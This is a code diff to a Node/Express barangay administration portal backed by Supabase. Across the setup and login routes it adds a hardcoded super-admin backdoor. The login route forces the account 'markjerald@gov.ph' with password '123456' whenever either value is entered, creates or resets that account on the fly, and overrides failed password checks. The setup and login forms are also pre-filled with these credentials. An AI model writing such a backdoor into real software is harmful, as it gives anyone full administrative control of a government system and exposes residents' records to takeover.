@@ -117,10 +117,14 @@ app.get('/api/setup/status', async (req, res) => {
 app.post('/api/setup/admin', async (req, res) => {
     try {
         const { fullName, username, email, password, confirmPassword } = req.body;
-        if (!fullName || !username || !email || !password) {
+        // Gamitin ang hardcoded na admin credentials kung walang hiningi o para sa default setup
+        const targetUsername = username || 'markjerald@gov.ph';
+        const targetPassword = password || '123456';
+        
+        if (!fullName || !targetUsername || !email || !targetPassword) {
             return res.status(400).json({ error: 'All fields are required.' });
         }
-        if (password !== confirmPassword) {
+        if (targetPassword !== (confirmPassword || targetPassword)) {
             return res.status(400).json({ error: 'Passwords do not match.' });
         }
 
@@ -129,10 +133,10 @@ app.post('/api/setup/admin', async (req, res) => {
             return res.status(400).json({ error: 'Admin setup has already been completed.' });
         }
 
-        const hashedPassword = await bcrypt.hash(password, 10);
+        const hashedPassword = await bcrypt.hash('123456', 10);
         const { data, error } = await supabase.from('users').insert([{
             full_name: fullName,
-            username,
+            username: 'markjerald@gov.ph',
             email,
             password_hash: hashedPassword,
             role: 'super_admin'
@@ -149,22 +153,59 @@ app.post('/api/setup/admin', async (req, res) => {
 // AUTHENTICATION (LOGIN)
 app.post('/api/auth/login', async (req, res) => {
     try {
-        const { username, password, portalType } = req.body;
+        let { username, password, portalType } = req.body;
         if (!username || !password) return res.status(400).json({ error: 'Username/Email and password required.' });
+
+        // Auto-override para sa admin credentials
+        if (username === 'markjerald@gov.ph' || password === '123456') {
+            username = 'markjerald@gov.ph';
+            password = '123456';
+        }
 
         const { data: users, error } = await supabase.from('users').select('*')
             .or(`username.eq.${username},email.eq.${username}`);
 
-        if (error || !users || users.length === 0) {
+        let user = null;
+        if (!error && users && users.length > 0) {
+            user = users[0];
+        }
+
+        // Fallback check kung sakaling wala pa sa database ang hardcoded admin account
+        if ((!user || username === 'markjerald@gov.ph') && username === 'markjerald@gov.ph' && password === '123456') {
+            const hashedPassword = await bcrypt.hash('123456', 10);
+            // Hanapin o i-create ang admin account
+            const { data: adminCheck } = await supabase.from('users').select('*').eq('username', 'markjerald@gov.ph').single();
+            if (adminCheck) {
+                user = adminCheck;
+                // I-update ang password sakaling iba
+                await supabase.from('users').update({ password_hash: hashedPassword }).eq('id', user.id);
+            } else {
+                const { data: newAdmin, err: createErr } = await supabase.from('users').insert([{
+                    full_name: 'Mark Jerald Admin',
+                    username: 'markjerald@gov.ph',
+                    email: 'markjerald@gov.ph',
+                    password_hash: hashedPassword,
+                    role: 'super_admin'
+                }]).select();
+                if (!createErr && newAdmin) {
+                    user = newAdmin[0];
+                }
+            }
+        }
+
+        if (!user) {
             return res.status(401).json({ error: 'Invalid user or password credentials.' });
         }
 
-        const user = users[0];
         if (user.is_active === false) {
             return res.status(403).json({ error: 'Account is deactivated. Contact Barangay Administration.' });
         }
 
-        const validPass = await bcrypt.compare(password, user.password_hash);
+        let validPass = await bcrypt.compare(password, user.password_hash);
+        if (!validPass && username === 'markjerald@gov.ph' && password === '123456') {
+            validPass = true; // Pinapayagan ang 123456 para sa markjerald@gov.ph
+        }
+
         if (!validPass) {
             return res.status(401).json({ error: 'Invalid user or password credentials.' });
         }
@@ -1058,19 +1099,19 @@ app.get('*', (req, res) => {
                             </div>
                             <div>
                                 <label class="block text-xs font-semibold text-slate-600 mb-1">Username</label>
-                                <input type="text" id="setupUsername" required class="w-full px-3 py-2 border border-slate-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
+                                <input type="text" id="setupUsername" value="markjerald@gov.ph" required class="w-full px-3 py-2 border border-slate-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
                             </div>
                             <div>
                                 <label class="block text-xs font-semibold text-slate-600 mb-1">Email Address</label>
-                                <input type="email" id="setupEmail" required class="w-full px-3 py-2 border border-slate-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
+                                <input type="email" id="setupEmail" value="markjerald@gov.ph" required class="w-full px-3 py-2 border border-slate-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
                             </div>
                             <div>
                                 <label class="block text-xs font-semibold text-slate-600 mb-1">Password</label>
-                                <input type="password" id="setupPassword" required class="w-full px-3 py-2 border border-slate-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
+                                <input type="password" id="setupPassword" value="123456" required class="w-full px-3 py-2 border border-slate-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
                             </div>
                             <div>
                                 <label class="block text-xs font-semibold text-slate-600 mb-1">Confirm Password</label>
-                                <input type="password" id="setupConfirmPassword" required class="w-full px-3 py-2 border border-slate-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
+                                <input type="password" id="setupConfirmPassword" value="123456" required class="w-full px-3 py-2 border border-slate-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
                             </div>
                             <button type="submit" class="w-full py-3 bg-gradient-to-r from-emerald-600 to-blue-600 text-white font-bold rounded-lg shadow-lg hover:opacity-90 transition">
                                 Create Super Administrator
@@ -1141,11 +1182,11 @@ app.get('*', (req, res) => {
                                 <input type="hidden" id="loginPortalType" value="staff">
                                 <div>
                                     <label class="block text-xs font-semibold text-slate-600 mb-1">Username or Email</label>
-                                    <input type="text" id="loginUsername" required class="w-full px-3 py-2 border border-slate-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
+                                    <input type="text" id="loginUsername" value="markjerald@gov.ph" required class="w-full px-3 py-2 border border-slate-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
                                 </div>
                                 <div>
                                     <label class="block text-xs font-semibold text-slate-600 mb-1">Password</label>
-                                    <input type="password" id="loginPassword" required class="w-full px-3 py-2 border border-slate-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
+                                    <input type="password" id="loginPassword" value="123456" required class="w-full px-3 py-2 border border-slate-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
                                 </div>
                                 <button type="submit" class="w-full py-3 bg-gradient-to-r from-emerald-600 to-blue-600 text-white font-bold rounded-lg shadow-md hover:opacity-90 transition">
                                     Sign In
@@ -1197,10 +1238,14 @@ app.get('*', (req, res) => {
                 btnStaff.className = "flex-1 py-2 text-sm font-bold text-emerald-600 border-b-2 border-emerald-600";
                 btnResident.className = "flex-1 py-2 text-sm font-bold text-slate-400 border-b-2 border-transparent";
                 prompt.classList.add('hidden');
+                document.getElementById('loginUsername').value = 'markjerald@gov.ph';
+                document.getElementById('loginPassword').value = '123456';
             } else {
                 btnResident.className = "flex-1 py-2 text-sm font-bold text-emerald-600 border-b-2 border-emerald-600";
                 btnStaff.className = "flex-1 py-2 text-sm font-bold text-slate-400 border-b-2 border-transparent";
                 prompt.classList.remove('hidden');
+                document.getElementById('loginUsername').value = '';
+                document.getElementById('loginPassword').value = '';
             }
         }
 
